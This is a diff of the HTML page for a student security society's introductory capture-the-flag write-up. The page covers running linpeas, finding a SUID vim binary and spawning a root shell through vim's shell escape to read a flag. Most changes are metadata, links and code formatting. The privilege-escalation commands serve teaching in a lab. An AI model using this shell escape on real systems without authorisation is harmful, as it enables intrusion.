@@ -9,13 +9,13 @@
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://cov-comsec.github.io/posts/welcome_nmap_writeup/"><meta property="og:image" content="https://cov-comsec.github.io/logo.svg"><meta property="article:section" content="posts">
 <meta property="article:published_time" content="2020-10-21T12:40:28+01:00">
-<meta property="article:modified_time" content="2021-10-23T00:22:39+01:00">
+<meta property="article:modified_time" content="2021-10-28T23:50:54+01:00">
 <meta name=twitter:card content="summary_large_image">
 <meta name=twitter:image content="https://cov-comsec.github.io/logo.svg">
 <meta name=twitter:title content="ComSec Introduction Writeup">
 <meta name=twitter:description content="A writeup for the introduction to ComSec challenges.">
 <meta name=application-name content="CUEH ComSec">
-<meta name=apple-mobile-web-app-title content="CUEH ComSec"><meta name=msapplication-TileColor content="#da532c"><link rel=stylesheet href=/css/forms.css media=screen><link rel=icon href=/CUEH.svg><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=canonical href=https://cov-comsec.github.io/posts/welcome_nmap_writeup/><link rel=prev href=https://cov-comsec.github.io/posts/docker-compose/><link rel=next href=https://cov-comsec.github.io/posts/web_enum/><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"ComSec Introduction Writeup","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/cov-comsec.github.io\/posts\/welcome_nmap_writeup\/"},"image":["https:\/\/cov-comsec.github.io\/CUEH.svg"],"genre":"posts","keywords":"welcome, TryHackMe, Nmap, writeup","wordcount":1343,"url":"https:\/\/cov-comsec.github.io\/posts\/welcome_nmap_writeup\/","datePublished":"2020-10-21T12:40:28+01:00","dateModified":"2021-10-23T00:22:39+01:00","publisher":{"@type":"Organization","name":"Jack Orcherton","logo":"https:\/\/cov-comsec.github.io\/CUEH.svg"},"author":{"@type":"Person","name":"Tiago Pascoal"},"description":"A writeup for the introduction to ComSec challenges."}</script></head>
+<meta name=apple-mobile-web-app-title content="CUEH ComSec"><meta name=msapplication-TileColor content="#da532c"><link rel=stylesheet href=/css/forms.css media=screen><link rel=icon href=/CUEH.svg><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=canonical href=https://cov-comsec.github.io/posts/welcome_nmap_writeup/><link rel=prev href=https://cov-comsec.github.io/posts/docker-compose/><link rel=next href=https://cov-comsec.github.io/posts/web_enum/><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"ComSec Introduction Writeup","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/cov-comsec.github.io\/posts\/welcome_nmap_writeup\/"},"image":["https:\/\/cov-comsec.github.io\/CUEH.svg"],"genre":"posts","keywords":"welcome, TryHackMe, Nmap, writeup","wordcount":1358,"url":"https:\/\/cov-comsec.github.io\/posts\/welcome_nmap_writeup\/","datePublished":"2020-10-21T12:40:28+01:00","dateModified":"2021-10-28T23:50:54+01:00","publisher":{"@type":"Organization","name":"Jack Orcherton","logo":"https:\/\/cov-comsec.github.io\/CUEH.svg"},"author":{"@type":"Person","name":"Tiago Pascoal"},"description":"A writeup for the introduction to ComSec challenges."}</script></head>
 <body header-desktop=fixed header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':'dark'==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:'dark'==='dark')&&document.body.setAttribute('theme','dark')</script>
 <div id=mask></div><div class=wrapper><header class=desktop id=header-desktop>
 <div class=header-wrapper>
@@ -83,7 +83,7 @@ Cancel
 <div class=toc-content id=toc-content-auto></div>
 </div><article class="page single"><h1 class="single-title animated flipInX">ComSec Introduction Writeup</h1><div class=post-meta>
 <div class=post-meta-line><span class=post-author><a href=/ title=Author rel=" author" class=author><i class="fas fa-user-circle fa-fw"></i>Tiago Pascoal</a></span>&nbsp;<span class=post-category>included in <a href=/categories/academic-year-2020-21/><i class="far fa-folder fa-fw"></i>Academic Year 2020-21</a></span></div>
-<div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2020-10-21>2020-10-21</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1343 words&nbsp;
+<div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2020-10-21>2020-10-21</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1358 words&nbsp;
 <i class="far fa-clock fa-fw"></i>&nbsp;7 minutes&nbsp;</div>
 </div><div class="details toc" id=toc-static kept=true>
 <div class="details-summary toc-title">
@@ -316,7 +316,7 @@ chmod +x linpeas.sh
 </div>
 </div><p>Take a look at the output and try to find the SUID section. If you don&rsquo;t know SUID is a type of permission that you have on linux that let&rsquo;s the user run the file or binary.</p>
 <p><img class=lazyload src=/svg/loading.min.svg data-src=imgs/linpeas.png data-srcset="/posts/welcome_nmap_writeup/imgs/linpeas.png, imgs/linpeas.png 1.5x, /posts/welcome_nmap_writeup/imgs/linpeas.png 2x" data-sizes=auto alt=/posts/welcome_nmap_writeup/imgs/linpeas.png title=linpeas></p>
-<p>That last line mentioning vim.basic maybe we can do some research and see how we can exploit it. Fortunately there is a good resource called <a href=https://gtfobins.github.io/ target=_blank rel="noopener noreffer">&ldquo;GTFOBINS&rdquo;</a>{target=_blank} which is used for looking how we can exploit binaries look for vim and you will see that you can spawn a shell inside vim or using the command.</p>
+<p>That last line mentioning vim.basic maybe we can do some research and see how we can exploit it. Fortunately there is a good resource called <a href=https://gtfobins.github.io/ target=_blank rel="noopener noreffer">GTFOBins</a> which is used for looking how we can exploit binaries look for vim and you will see that you can spawn a shell inside vim or using the command.</p>
 <div class=highlight><div class=chroma>
 <table class=lntable><tr><td class=lntd>
 <pre tabindex=0 class=chroma><code><span class=lnt>1
@@ -324,9 +324,9 @@ chmod +x linpeas.sh
 </span><span class=lnt>3
 </span></code></pre></td>
 <td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>:!/bin/sh
-#or
-vim -c &#39;:!/bin/sh&#39;
+<pre tabindex=0 class=chroma><code class=language-sh data-lang=sh>:!/bin/sh
+<span class=c1>#or</span>
+vim -c <span class=s1>&#39;:!/bin/sh&#39;</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>Now you are root!</p>
@@ -336,19 +336,17 @@ vim -c &#39;:!/bin/sh&#39;
 </span><span class=lnt>2
 </span></code></pre></td>
 <td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=nb>cd</span> /root
+<pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=nb>cd</span> /root
 cat flag.txt
 </code></pre></td></tr></table>
 </div>
-</div><p>Congrats!
-Any doubts contact ComSec Committee on discord.
-Don&rsquo;t to submit your flags in <a href=https://cueh-comsec.ctfd.io/ target=_blank rel="noopener noreffer">CTFD</a></p>
+</div><p>Congratulations on solving the first ComSec challenge. Don&rsquo;t forget to submit your flags on CTFd. If you need any help, feel free to comment below or contact us on discord!</p>
 </div><div class=post-footer id=post-footer>
 <div class=post-info>
 <div class=post-info-line>
 <div class=post-info-mod>
-<span>Updated on 2021-10-23&nbsp;<a class=git-hash href=https://github.com/Cov-ComSec/Cov-ComSec.github.io/commit/cc1ee89968f6d3b1b2139c08564fe50b5451c926 target=_blank title="commit by Jack Orcherton(31766070+jackorcherton@users.noreply.github.com) cc1ee89968f6d3b1b2139c08564fe50b5451c926: Switched some Images to code fences">
-<i class="fas fa-hashtag fa-fw"></i>cc1ee89</a></span>
+<span>Updated on 2021-10-28&nbsp;<a class=git-hash href=https://github.com/Cov-ComSec/Cov-ComSec.github.io/commit/17641cfc4aacc0afdc9b4de51cd627b8e4c2c5ad target=_blank title="commit by Jack Orcherton(31766070+jackorcherton@users.noreply.github.com) 17641cfc4aacc0afdc9b4de51cd627b8e4c2c5ad: Update links">
+<i class="fas fa-hashtag fa-fw"></i>17641cf</a></span>
 </div>
 <div class=post-info-license></div>
 </div>
